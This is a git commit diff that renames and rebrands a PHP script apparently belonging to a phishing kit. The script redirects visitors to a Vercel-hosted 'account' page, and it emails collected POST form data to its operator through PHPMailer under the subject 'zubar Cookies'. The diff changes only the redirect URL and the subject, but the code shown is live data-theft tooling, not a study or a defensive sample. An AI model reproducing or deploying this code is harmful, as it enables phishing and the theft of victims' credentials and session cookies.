93d1cfc9324e4f08ee70bec8c728f482e7781510
Ontres44322 <onlinemeta858@gmail.com>
2025-07-10 01:19:53 +0500

    Update and rename Abr.php to Zubar.php

--- Zubar.php
+++ Zubar.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://open-account-page.vercel.app/");
+header("Location: https://account-team-page.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abr Cookies';
+        $mail->Subject = 'zubar Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
